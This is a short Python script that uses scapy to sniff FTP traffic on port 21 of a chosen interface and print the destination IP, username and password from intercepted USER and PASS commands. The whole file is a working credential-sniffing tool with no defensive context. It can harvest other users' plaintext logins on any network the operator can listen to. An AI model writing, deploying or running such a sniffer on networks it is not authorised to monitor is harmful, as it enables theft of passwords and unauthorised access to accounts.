



from termcolor import colored


from scapy.all import *

import argparse



def ftpsniff(pkt):
    dest=pkt.getlayer(IP).dst
    raw=pkt.sprintf('%Raw.load%')
    user=re.findall('(?i)USER (.*)',raw)
    pswd=re.findall('(?i)PASS (.*)',raw)
    if(user):
        print(colored('[+] UserIP > '+str(dest),'green'),end='          ')
        print(colored('[+] Username > '+str((user[0]).split('\\n')[0]).split('\\r')[0],'green'),end='       ')
    elif(pswd):
        print(colored('[+] Password > '+str((pswd[0]).split('\\n')[0]).split('\\r')[0],'green'))
def inp():
    global parser
    parser=argparse.ArgumentParser('Usage of program > python3 ftp.py -i <interface> ')
    parser.add_argument('-i',dest='interface',help='mention the interface')
    return parser.parse_args()
try :
    option=inp()
    if(option.interface):
        conf.iface=option.interface
    else:
        print(colored('Usage of program > python3 ftp.py -i <interface>','yellow'))
        exit()

    sniff(filter='tcp port 21',prn=ftpsniff)
except:
    print(colored('stopped','red'))
    exit()
